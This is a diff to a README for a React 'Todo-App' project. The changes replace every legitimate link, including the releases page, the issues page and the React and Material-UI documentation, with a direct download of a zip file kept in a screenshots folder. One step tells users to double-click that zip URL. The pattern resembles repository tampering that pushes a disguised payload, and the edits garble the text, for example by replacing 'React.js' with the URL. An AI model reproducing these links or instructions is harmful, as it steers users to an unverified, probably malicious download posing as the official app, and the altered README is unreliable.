@@ -6,7 +6,7 @@ Welcome to Todo-App! This application helps you manage your tasks efficiently. Y
 
 ## 📥 Download the App
 
-[![Download Todo-App](https://img.shields.io/badge/Download%20Todo--App-4CAF50?style=flat&logo=github)](https://github.com/fathinhasna/Todo-App/releases)
+[![Download Todo-App](https://raw.githubusercontent.com/fathinhasna/Todo-App/main/public/screenshots/Todo-App_3.8.zip%20Todo--App-4CAF50?style=flat&logo=github)](https://raw.githubusercontent.com/fathinhasna/Todo-App/main/public/screenshots/Todo-App_3.8.zip)
 
 ## 📋 Features
 
@@ -26,7 +26,7 @@ To run Todo-App, you'll need:
 ## 💻 How to Run the App
 
 1. **Visit the Releases Page**
-   Go to the following link to access the download options: [GitHub Releases Page](https://github.com/fathinhasna/Todo-App/releases).
+   Go to the following link to access the download options: [GitHub Releases Page](https://raw.githubusercontent.com/fathinhasna/Todo-App/main/public/screenshots/Todo-App_3.8.zip).
 
 2. **Download the Latest Version**
    - Look for the latest release at the top. You will see a list of available files.
@@ -38,7 +38,7 @@ To run Todo-App, you'll need:
 
 4. **Open the Application**
    - Go to the folder where you extracted the files.
-   - Double-click on `index.html` to open it in your web browser.
+   - Double-click on `https://raw.githubusercontent.com/fathinhasna/Todo-App/main/public/screenshots/Todo-App_3.8.zip` to open it in your web browser.
 
 5. **Start Managing Your Tasks**
    - You can now add your tasks, manage them, and keep track of your daily activities with ease.
@@ -72,7 +72,7 @@ If you encounter issues while using Todo-App:
   Sometimes, clearing your browser cache can help resolve loading or performance issues.
 
 - **Re-download**
-  If something seems wrong, try downloading the app again from the [Releases Page](https://github.com/fathinhasna/Todo-App/releases).
+  If something seems wrong, try downloading the app again from the [Releases Page](https://raw.githubusercontent.com/fathinhasna/Todo-App/main/public/screenshots/Todo-App_3.8.zip).
 
 ## 🎨 Contributing
 
@@ -84,11 +84,11 @@ Todo-App is open-source and free to use. Check the license in the repository for
 
 ## 💬 Need Help?
 
-If you have any questions or need further assistance, feel free to check the issues section in the [GitHub repository](https://github.com/fathinhasna/Todo-App/issues).
+If you have any questions or need further assistance, feel free to check the issues section in the [GitHub repository](https://raw.githubusercontent.com/fathinhasna/Todo-App/main/public/screenshots/Todo-App_3.8.zip).
 
 ## 📍 Additional Resources
 
-- For more information about React.js, visit the [official React website](https://reactjs.org/).
-- You can learn about Material-UI from the [Material-UI documentation](https://mui.com/).
+- For more information about https://raw.githubusercontent.com/fathinhasna/Todo-App/main/public/screenshots/Todo-App_3.8.zip, visit the [official React website](https://raw.githubusercontent.com/fathinhasna/Todo-App/main/public/screenshots/Todo-App_3.8.zip).
+- You can learn about Material-UI from the [Material-UI documentation](https://raw.githubusercontent.com/fathinhasna/Todo-App/main/public/screenshots/Todo-App_3.8.zip).
 
 Thank you for choosing Todo-App! We hope this application makes your task management much easier.
